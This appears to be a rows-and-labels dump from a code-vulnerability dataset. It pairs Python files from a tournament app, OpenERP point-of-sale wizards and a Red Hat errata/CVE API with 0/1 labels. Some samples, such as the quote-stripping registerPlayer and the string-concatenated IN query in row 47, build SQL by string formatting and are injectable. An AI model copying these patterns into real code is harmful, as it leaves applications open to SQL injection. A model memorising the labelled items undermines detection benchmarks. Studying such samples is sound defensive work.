    """"""Connect to the PostgreSQL database.  Returns a database connection.""""""
    return psycopg2.connect(""dbname=tournament"")


def deleteMatches():
    """"""Remove all the match records from the database.""""""
    db = connect()
    c = db.cursor()
    c.execute(""DELETE FROM matches;"")
    db.commit()
    db.close


def deletePlayers():
    """"""Remove all the player records from the database.""""""
    deleteMatches()
    db = connect()
    c = db.cursor()
    c.execute(""DELETE FROM players;"")
    db.commit()
    db.close


def countPlayers():
    """"""Returns the number of players currently registered.""""""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT COUNT(*) FROM players;"")
    rows = c.fetchone()
    db.close
    return rows[0]


def registerPlayer(name):
    """"""Adds a player to the tournament database.

    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)

    Args:
      name: the player's full name (need not be unique).
    """"""

    db = connect()
    c = db.cursor()
    # remove any occurance of quotes/apostrophes to prevent sql injection
    safe_n = name = name.translate(None, '\'\""')
    query = ""INSERT INTO players (name) values ('{name}')"".format(name=safe_n)
    c.execute(query)
    db.commit()
    db.close()


def playerStandings():
    """"""Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """"""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT * FROM standings"")
    rows = c.fetchall()
    db.close()
    return rows


def reportMatch(winner, loser):
    """"""Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """"""
    try:
        int(winner)
        int(loser)
    except ValueError:
        raise ValueError(
            ""\""winner\"" and/or \""loser\"" input are not integers.\n""
            ""Please use the id number of each player to report match results.""
        )
    w = str(winner)
    l = str(loser)
    db = connect()
    c = db.cursor()
    statement = ""INSERT INTO matches values ({w}, {l})"".format(w=w, l=l)
    c.execute(statement)
    db.commit()
    db.close()


def swissPairings():
    """"""Returns a list of pairs of players for the next round of a match.

    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.

    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """"""
    db = connect()
    c = db.cursor()
    c.execute(""SELECT * FROM pairup;"")
    rows = c.fetchall()
    db.close()
    return list(reversed(rows))
/n/n/n",1
46,46,b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c,"addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """"""
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """"""
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': ""[('id','in',"" + str(list_statement) + "")]"",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """"""
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """"""
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for ""%s"". \n Please close the cashbox related to. ' %(journal.name)))
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
            'domain': ""[('state','=','open')]"",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",0
47,47,b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c,"/addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """"""
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """"""
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute("""""" select id from account_journal
                            where auto_cash='True' and type='cash'
                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))
        journal_ids = map(lambda x1: x1[0], cr.fetchall())

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': ""[('id','in',"" + str(list_statement) + "")]"",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n/addons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """"""
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """"""
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute(""""""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id""""""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute("""""" select id from account_journal
                            where auto_cash='True' and type='cash'
                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))
        journal_ids = map(lambda x1: x1[0], cr.fetchall())

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for ""%s"". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute("""""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1"""""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute(""INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')""%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute(""select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'""%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print ""statement_id"",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': ""[('id','in', [""+','.join(map(str,list_statement))+""])]"",
            'domain': ""[('state','=','open')]"",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",1
116,116,49603ff9d29a9d411a681b3cc8096a6585ec1272,"webapp/cve.py/n/n""""""
Module contains functions and CVE class for returning data from DB
""""""


class CVE:
    """"""
    Class to hold CVE attributes
    """"""
    cve_cwe_map = None

    def __init__(self, cve_entry, column_names):
        for col_name in column_names:
            setattr(self, col_name, cve_entry[column_names.index(col_name)])
        self.cwe = self.associate_cwes()

    def associate_cwes(self):
        """"""
        Assigns cve to cwe and creates a list
        :return:
        """"""
        cwe_map = []
        if CVE.cve_cwe_map is not None:
            cwe_map = [item[1] for item in CVE.cve_cwe_map if self.get_val(""cve.id"") == item[0]]
        return cwe_map

    def get_val(self, attr_name):
        """"""
        Return CVE attribute or None
        :param attr_name: attr_name
        :return: attribute
        """"""
        value = None
        if attr_name in vars(self):
            value = getattr(self, attr_name)
        return value

class CveAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def process_list(self, data):
        """"""
        This method returns details for given set of CVEs.

        :param data: data obtained from api, we're interested in data[""cve_list""]

        :returns: list of dictionaries containing detailed information for given cve list}

        """"""

        cves_to_process = data[""cve_list""]
        cves_to_process = filter(None, cves_to_process)
        answer = {}
        if not cves_to_process:
            return answer

        # Select all cves in request
        cve_query = """"""SELECT cve.id, cve.redhat_url, cve.secondary_url, cve.name, severity.name,
                              cve.published_date, cve.modified_date, cve.iava, cve.description
                         FROM cve
                         LEFT JOIN severity ON cve.severity_id = severity.id
                        WHERE cve.name IN %s""""""
        self.cursor.execute(cve_query, [tuple(cves_to_process)])
        cves = self.cursor.fetchall()
        cwe_map = self.get_cve_cwe_map([cve[column_names.index(""cve.id"")] for cve in cves])  # generate cve ids
        CVE.cve_cwe_map = cwe_map
        cve_list = []
        for cve_entry in cves:
            cve = CVE(cve_entry, column_names)
            cve_list.append(cve)

        return self.construct_answer(cve_list)


    def get_cve_cwe_map(self, ids):
        """"""
        For givers CVE ids find CWE in DB
        :param ids: CVE ids
        :return: cve_cwe mapping
        """"""
        if not ids:
            return []
        query = """"""SELECT cve_id, cwe.name, cwe.link
                     FROM cve_cwe map
                     JOIN cwe ON map.cwe_id = cwe.id
                    WHERE map.cve_id IN %s""""""
        self.cursor.execute(query, [tuple(ids)])
        return self.cursor.fetchall()


    @staticmethod
    def construct_answer(cve_list):
        """"""
        Final dictionary generation
        :param cve_list: which cves to show
        :return: JSON ready dictionary
        """"""
        response = {}
        for cve in cve_list:
            response[cve.get_val(""cve.name"")] = {
                ""redhat_url"": cve.get_val(""redhat_url""),
                ""secondary_url"": cve.get_val(""secondary_url""),
                ""synopsis"": cve.get_val(""cve.name""),
                ""impact"": cve.get_val(""severity.name""),
                ""public_date"": cve.get_val(""published_date""),
                ""modified_date"": cve.get_val(""modified_date""),
                ""iava"": cve.get_val(""iava""),
                ""cwe_list"": cve.get_val(""cwe""),
                ""description"": cve.get_val(""description""),
            }
        return response
/n/n/nwebapp/errata.py/n/n""""""
Module contains classes for returning errata data from DB
""""""

class Errata:
    """"""
    Class to hold Erratum attributes
    """"""

    def __init__(self, id, name, synopsis, severity, description, solution, issued, updated):
        setattr(self, ""name"", name)
        setattr(self, ""id"", id)
        mydict = {}
        mydict[""type""] = None
        mydict[""issued""] = str(issued)
        mydict[""synopsis""] = synopsis
        mydict[""description""] = description
        mydict[""solution""] = solution
        mydict[""severity""] = severity
        mydict[""summary""] = None
        mydict[""updated""] = str(updated)
        mydict[""url""] = ""https://access.redhat.com/errata/%s"" % name
        mydict[""bugzilla_list""] = []
        mydict[""cve_list""] = []
        mydict[""package_list""] = []
        mydict[""reference_list""] = []
        setattr(self, ""mydict"", mydict)

    def set_cve_names(self, cve_name_list):
        mydict = self.get_val(""mydict"")
        mydict[""cve_list""] = cve_name_list

    def set_packages(self, package_list):
        mydict = self.get_val(""mydict"")
        mydict[""package_list""] = package_list

    def get_val(self, attr_name):
        """"""
        Return Erratum attribute or None
        :param attr_name: attr_name
        :return: attribute
        """"""
        value = None
        if attr_name in vars(self):
            value = getattr(self, attr_name)
        return value

class ErrataAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def get_cve_names_for_erratum_id(self, id):
        """"""
        Get the list of cves for the given erratum id
        """"""
        cve_query = """"""SELECT name FROM cve
                         JOIN errata_cve ON cve_id = cve.id
                        WHERE errata_cve.errata_id = %s""""""
        self.cursor.execute(cve_query, (id,))
        cve_names = self.cursor.fetchall()
        cve_name_list = []
        for cve_name in cve_names:
            cve_name_list.append(cve_name[0])
        return cve_name_list

    @staticmethod
    def build_package_name(name, epoch, version, release, arch):
        """"""
        Build a package name from the separate NEVRA parts
        """"""
        package_name = name + ""-""
        if int(epoch) > 0:
            package_name += ""%s:"" % epoch
        package_name += ""%s-%s.%s"" % (version, release, arch)
        return package_name

    def get_package_list_for_erratum_id(self, id):
        """"""
        Get the list of packages for the given erratum id
        """"""
        pkg_query = """"""SELECT package.name, evr.epoch, evr.version, evr.release, arch.name
                         FROM pkg_errata
                         JOIN package ON package.id = pkg_errata.pkg_id
                         JOIN evr ON evr.id = package.evr_id
                         JOIN arch ON arch.id = package.arch_id
                        WHERE pkg_errata.errata_id = %s""""""
        self.cursor.execute(pkg_query, (id,))
        result = self.cursor.fetchall()
        package_list = []
        for name, epoch, version, release, arch in result:
            package_list.append(self.build_package_name(name, epoch, version, release, arch))
        return package_list

    def process_list(self, data):
        """"""
        This method returns details for given set of Errata.

        :param cursor: psycopg2 connection cursor
        :param data: data obtained from api, we're interested in data[""errata_list""]

        :returns: dictionary containing detailed information for given errata list}

        """"""

        errata_to_process = data[""errata_list""]
        errata_to_process = filter(None, errata_to_process)
        answer = {}

        if not errata_to_process:
            return answer

        # Select all errata in request
        errata_query = """"""SELECT errata.id, errata.name, synopsis, severity.name, description,
                                 solution, issued, updated
                            FROM errata
                            LEFT JOIN severity ON severity_id = severity.id
                           WHERE errata.name IN %s""""""
        self.cursor.execute(errata_query, [tuple(errata_to_process)])
        errata = self.cursor.fetchall()

        erratum_list = []
        for id, name, synopsis, severity, description, solution, issued, updated in errata:
            new_erratum = Errata(id, name, synopsis, severity, description, solution, issued, updated)
            new_erratum.set_cve_names(self.get_cve_names_for_erratum_id(id))
            new_erratum.set_packages(self.get_package_list_for_erratum_id(id))
            erratum_list.append(new_erratum)

        errata_dict = {}
        for e in erratum_list:
            errata_dict[e.get_val(""name"")] = e.get_val(""mydict"")
        answer[""errata_list""] = errata_dict
        return answer
/n/n/nwebapp/updates.py/n/n#!/usr/bin/python -u


def split_filename(filename):
    """"""
    Pass in a standard style rpm fullname

    Return a name, version, release, epoch, arch, e.g.::
        foo-1.0-1.i386.rpm returns foo, 1.0, 1, 0, i386
        bar-1:9-123a.ia64.rpm returns bar, 9, 123a, 1, ia64
    """"""

    is_epoch = True if filename.find(':') != -1 else False

    if filename[-4:] == '.rpm':
        filename = filename[:-4]

    arch_index = filename.rfind('.')
    arch = filename[arch_index + 1:]

    rel_index = filename[:arch_index].rfind('-')
    rel = filename[rel_index + 1:arch_index]

    if is_epoch:
        ver_index = filename[:rel_index].rfind(':')
    else:
        ver_index = filename[:rel_index].rfind('-')
    ver = filename[ver_index + 1:rel_index]


    if is_epoch:
        epoch_index = filename[:ver_index].rfind('-')
        epoch = filename[epoch_index + 1:ver_index]
    else:
        epoch_index = ver_index
        epoch = '0'

    name = filename[:epoch_index]
    return name, ver, rel, epoch, arch


class UpdatesAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def process_list(self, data):
        """"""
        This method is looking for updates of a package, including name of package to update to,
        associated erratum and repository this erratum is from.

        :param packages_to_process: list of package to find updates for every of them

        :returns: updates for a package in format of list of dictionaries {'package': <p_name>, 'erratum': <e_name>,
        'repository': <r_name>}

        """"""

        packages_to_process = data['package_list']
        auxiliary_dict = {}
        answer = {}

        if not packages_to_process:
            return answer

        provided_repo_ids = None
        provided_repo_names = None

        if 'repository_list' in data:
            provided_repo_names = data['repository_list']
            provided_repo_ids = []
            self.cursor.execute(""select id from repo where name in %s;"", [tuple(provided_repo_names)])
            for id_tuple in self.cursor.fetchall():
                for id in id_tuple:
                    provided_repo_ids.append(id)

        # Select all evrs and put them into dictionary
        self.cursor.execute(""SELECT id, epoch, version, release from evr"")
        evrs = self.cursor.fetchall()
        evr2id_dict = {}
        id2evr_dict = {}
        for id, e, v, r in evrs:
            key = e + ':' + v + ':' + r
            evr2id_dict[key] = id
            id2evr_dict[id] = {'epoch': e, 'version': v, 'release': r}

        # Select all archs and put them into dictionary
        self.cursor.execute(""SELECT id, name from arch"")
        archs = self.cursor.fetchall()
        arch2id_dict = {}
        id2arch_dict = {}
        for id, name in archs:
            arch2id_dict[name] = id
            id2arch_dict[id] = name

        packages_names = []
        packages_evrids = []

        for pkg in packages_to_process:
            pkg = str(pkg)

            # process all packages form input
            if pkg not in auxiliary_dict:
                n, v, r, e, a = split_filename(str(pkg))
                auxiliary_dict[pkg] = {}  # create dictionary with aux data for pkg

                evr_key = e + ':' + v + ':' + r
                if evr_key in evr2id_dict:
                    packages_names.append(n)
                    auxiliary_dict[pkg][n] = []

                    evr_id = evr2id_dict[evr_key]
                    packages_evrids.append(evr_id)
                    auxiliary_dict[pkg]['evr_id'] = evr_id
                    auxiliary_dict[pkg]['arch_id'] = arch2id_dict[a]
                    auxiliary_dict[pkg]['repo_id'] = []
                    auxiliary_dict[pkg]['pkg_id'] = []
                    auxiliary_dict[pkg]['update_id'] = []

        # Select all packages with given evrs ids and put them into dictionary
        self.cursor.execute(""select id, name, evr_id, arch_id from package where evr_id in %s;"",  [tuple(packages_evrids)])
        packs = self.cursor.fetchall()
        nevra2pkg_id = {}
        for id, name, evr_id, arch_id in packs:
            key = name + ':' + str(evr_id) + ':' + str(arch_id)
            if key not in nevra2pkg_id:
                nevra2pkg_id[key] = [id]
            else:
                nevra2pkg_id[key].append(id)

        pkg_ids = []
        for pkg in auxiliary_dict.keys():
            n, v, r, e, a = split_filename(str(pkg))

            try:
                key = str(n + ':' + str(auxiliary_dict[pkg]['evr_id']) + ':' + str(auxiliary_dict[pkg]['arch_id']))
                pkg_ids.extend(nevra2pkg_id[key])
                auxiliary_dict[pkg]['pkg_id'].extend(nevra2pkg_id[key])
            except KeyError:
                pass

        # Select all repo_id and add mapping to package id
        self.cursor.execute(""select pkg_id, repo_id from pkg_repo where pkg_id in %s;"", [tuple(pkg_ids)])
        pack_repo_ids = self.cursor.fetchall()
        pkg_id2repo_id = {}

        repo_ids = []

        for pkg_id, repo_id in pack_repo_ids:
            repo_ids.append(repo_id)

            if pkg_id in pkg_id2repo_id:
                pkg_id2repo_id[pkg_id].append(repo_id)
            else:
                pkg_id2repo_id[pkg_id] = [repo_id]

        for pkg in auxiliary_dict.keys():
                try:
                    for pkg_id in auxiliary_dict[pkg]['pkg_id']:
                        auxiliary_dict[pkg]['repo_id'].extend(pkg_id2repo_id[pkg_id])
                except KeyError:
                    pass

        self.cursor.execute(""select name, id from package where name in %s;"", [tuple(packages_names)])
        sql_result = self.cursor.fetchall()
        names2ids = {}
        for name, id in sql_result:

            if name in names2ids:
                names2ids[name].append(id)
            else:
                names2ids[name] = [id]

        for pkg in auxiliary_dict.keys():
            n, v, r, e, a = split_filename(str(pkg))

            try:
                auxiliary_dict[pkg][n].extend(names2ids[n])
            except KeyError:
                pass

        update_pkg_ids = []

        sql = """"""SELECT package.id
                   FROM package
                   JOIN evr ON package.evr_id = evr.id
                  WHERE package.id in %s and evr.evr > (select evr from evr where id = %s)""""""
        for pkg in auxiliary_dict:
            n, v, r, e, a = split_filename(str(pkg))

            if n in auxiliary_dict[pkg] and auxiliary_dict[pkg][n]:
                self.cursor.execute(sql, [tuple(auxiliary_dict[pkg][n]),
                                          auxiliary_dict[pkg]['evr_id']])

                for id in self.cursor.fetchall():
                    auxiliary_dict[pkg]['update_id'].append(id[0])
                    update_pkg_ids.append(id[0])

        # Select all info about repos
        self.cursor.execute(""select id, name, url from repo where id in %s;"", [tuple(repo_ids)])
        all_repos = self.cursor.fetchall()
        repoinfo_dict = {}
        for id, name, url in all_repos:
            repoinfo_dict[id] = {'name': name, 'url': url}

        # Select all info about pkg_id to repo_id
        self.cursor.execute(""select pkg_id, repo_id from pkg_repo where pkg_id in %s;"", [tuple(update_pkg_ids)])
        all_pkg_repos = self.cursor.fetchall()
        pkg_id2repo_id = {}
        for pkg_id, repo_id in all_pkg_repos:

            if pkg_id not in pkg_id2repo_id:
                pkg_id2repo_id[pkg_id] = [repo_id]
            else:
                pkg_id2repo_id[pkg_id].append(repo_id)

        # Select all info about pkg_id to errata_id
        self.cursor.execute(""select pkg_id, errata_id from pkg_errata where pkg_id in %s;"", [tuple(update_pkg_ids)])
        all_pkg_errata = self.cursor.fetchall()
        pkg_id2errata_id = {}
        all_errata = []
        for pkg_id, errata_id in all_pkg_errata:
            all_errata.append(errata_id)
            if pkg_id not in pkg_id2errata_id:
                pkg_id2errata_id[pkg_id] = [errata_id]
            else:
                pkg_id2errata_id[pkg_id].append(errata_id)

        # Select all info about errata
        self.cursor.execute(""SELECT id, name from errata where id in %s;"", [tuple(all_errata)])
        errata = self.cursor.fetchall()
        id2errata_dict = {}
        all_errata_id = []
        for id, name in errata:
            id2errata_dict[id] = name
            all_errata_id.append(id)

        self.cursor.execute(""SELECT errata_id, repo_id from errata_repo where errata_id in %s;"", [tuple(all_errata_id)])
        sql_result = self.cursor.fetchall()
        errata_id2repo_id = {}
        for errata_id, repo_id in sql_result:
            if errata_id not in errata_id2repo_id:
                errata_id2repo_id[errata_id] = [repo_id]
            else:
                errata_id2repo_id[errata_id].append(repo_id)

        # Select all info about packages
        self.cursor.execute(""SELECT id, name, evr_id, arch_id from package where id in %s;"", [tuple(update_pkg_ids)])
        packages = self.cursor.fetchall()
        pkg_id2full_name = {}
        pkg_id2arch_id = {}
        for id, name, evr_id, arch_id in packages:
            full_rpm_name = name + '-'
            if id2evr_dict[evr_id]['epoch'] != '0':
